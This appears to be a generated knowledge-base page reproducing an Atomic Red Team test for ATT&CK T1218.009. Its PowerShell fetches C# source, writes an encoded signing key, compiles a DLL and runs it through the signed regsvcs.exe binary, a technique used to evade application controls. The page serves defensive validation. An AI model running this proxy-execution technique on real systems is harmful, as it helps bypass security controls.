---
atomic_guid: "fd3c1c6a-02d2-4b72-82d9-71c527abb126"
title: "Regsvcs Uninstall Method Call Test"
framework: "atomic"
generated: "true"
attack_technique_id: "T1218.009"
attack_technique_name: "Signed Binary Proxy Execution: Regsvcs/Regasm"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.009/T1218.009.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "fd3c1c6a-02d2-4b72-82d9-71c527abb126"
  - "Regsvcs Uninstall Method Call Test"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Regsvcs Uninstall Method Call Test

Executes the Uninstall Method, No Admin Rights Required, Requires SNK. Upon execution, "I shouldn't really execute" will be displayed
along with other information about the assembly being installed.

## Metadata

- Atomic GUID: fd3c1c6a-02d2-4b72-82d9-71c527abb126
- Technique: T1218.009: Signed Binary Proxy Execution: Regsvcs/Regasm
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1218.009/T1218.009.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.009]]

## Input Arguments

### output_file

- description: Location of the payload
- type: path
- default: $Env:TEMP\T1218.009.dll

### source_file

- description: Location of the CSharp source_file
- type: path
- default: PathToAtomicsFolder\T1218.009\src\T1218.009.cs

## Dependencies

The CSharp source file must exist on disk at specified location (#{source_file})

### Prerequisite Check

```powershell
if (Test-Path "#{source_file}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory (split-path "#{source_file}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.009/src/T1218.009.cs" -OutFile "#{source_file}"
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content $env:Temp\key.snk -Value $Content -Encoding Byte
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"#{output_file}" /target:library /keyfile:$env:Temp\key.snk #{source_file}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{output_file}
```

### Cleanup

```powershell
Remove-Item #{output_file} -ErrorAction Ignore | Out-Null
$parentpath = Split-Path -Path "#{output_file}"
Remove-Item $parentpath\key.snk -ErrorAction Ignore | Out-Null
Remove-Item $parentpath\T1218.009.tlb -ErrorAction Ignore | Out-Null
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.009/T1218.009.yaml)
